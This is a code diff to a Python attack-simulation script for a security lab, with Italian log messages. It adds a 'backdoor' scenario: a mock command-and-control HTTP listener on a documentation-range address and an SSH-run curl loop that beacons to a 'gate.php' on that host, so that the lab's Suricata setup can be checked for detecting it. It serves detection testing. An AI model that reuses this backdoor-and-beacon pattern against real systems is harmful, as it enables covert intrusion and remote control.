@@ -5,6 +5,7 @@ same table as the simulated mode), so the map shows where "the attackers" are. N
 command from outside: the console can only pick one of these scenarios.
 """
 import http.client
+import http.server
 import os
 import subprocess
 import sys
@@ -28,7 +29,12 @@ PERSONAS = {
     "203.0.113.15": "Dallas, Stati Uniti",
     "203.0.113.18": "San Paolo, Brasile",
     "203.0.113.20": "Shenzhen, Cina",
+    "203.0.113.66": "Mosca, Russia",
 }
+
+# The backdoor's controller: an HTTP listener on the attacker, which lab-01 calls once the intruder is in.
+C2 = "203.0.113.66"
+C2_PORT = 8000
 HOMES = [f"192.0.2.{n}" for n in range(11, 23)]
 
 LAB_PASSWORD = "Alveo2026!"  # operatore's password on lab-01: a lab account, nowhere else.
@@ -172,9 +178,38 @@ def campaign(log):
             ssh_try(src, "scada", pw, log)
 
 
+class _Gate(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"sleep 600\n")
+
+    def log_message(self, *args):
+        pass
+
+
+def start_c2():
+    """The controller listens only on its own lab address: lab-01 is the only machine that can reach it."""
+    try:
+        server = http.server.ThreadingHTTPServer((C2, C2_PORT), _Gate)
+    except OSError:
+        return
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+
+
+def backdoor(log):
+    src = "198.51.100.213"
+    log("l'intruso entra con la password trovata e installa una backdoor che chiama il suo server di controllo")
+    beacon = f"for i in 1 2 3; do curl -s -o /dev/null -A 'Mozilla/5.0' http://{C2}:{C2_PORT}/gate.php?id=lab-01; sleep 5; done; echo backdoor attiva"
+    ssh_try(src, "operatore", LAB_PASSWORD, log, command=beacon)
+    log(f"lab-01 → {C2}:{C2_PORT}/gate.php: tre chiamate al server di controllo")
+
+
 def full_night(log):
     for title, fn in [("Scansione delle porte", port_scan), ("Protocolli industriali", industrial_probe),
-                      ("Scansione del sito", web_scan), ("Exploit web", web_exploit), ("Intrusione", intrusion)]:
+                      ("Scansione del sito", web_scan), ("Exploit web", web_exploit), ("Intrusione", intrusion),
+                      ("Backdoor", backdoor)]:
         log(f"— {title} —")
         fn(log)
 
@@ -188,6 +223,8 @@ SCENARIOS = [
      "expect": "Dopo 5 tentativi fail2ban banna l'indirizzo: gli ultimi tentativi non ricevono risposta."},
     {"id": "intrusion", "title": "Intrusione lenta e accesso riuscito", "source": "198.51.100.213", "run": intrusion,
      "expect": "Scansione, 4 password sbagliate sotto la soglia, poi l'accesso: LoginAfterFailures, gravità critica."},
+    {"id": "backdoor", "title": "Backdoor che chiama casa", "source": C2, "run": backdoor,
+     "expect": "Dopo l'accesso, lab-01 chiama il server di controllo: Suricata lo vede, CommandAndControl, gravità critica."},
     {"id": "web-scan", "title": "Scansione del sito", "source": "203.0.113.14", "run": web_scan,
      "expect": "Richieste a .env, .git, WordPress, phpMyAdmin: WebVulnerabilityScan, ban di nginx-botsearch."},
     {"id": "web-exploit", "title": "Tentativi di exploit web", "source": "203.0.113.9", "run": web_exploit,
@@ -199,7 +236,7 @@ SCENARIOS = [
     {"id": "campaign", "title": "Campagna distribuita su un account", "source": "192.0.2.11–22", "run": campaign,
      "expect": "12 indirizzi, 2 tentativi ciascuno sull'account scada: nessun ban, una campagna DistributedSshBruteForce."},
     {"id": "full-night", "title": "La notte completa (in sequenza)", "source": "più indirizzi", "run": full_night,
-     "expect": "Scansione, protocolli industriali, sito, exploit e infine l'intrusione: circa tre minuti."},
+     "expect": "Scansione, protocolli industriali, sito, exploit, l'intrusione e la backdoor: circa tre minuti."},
 ]
 
 
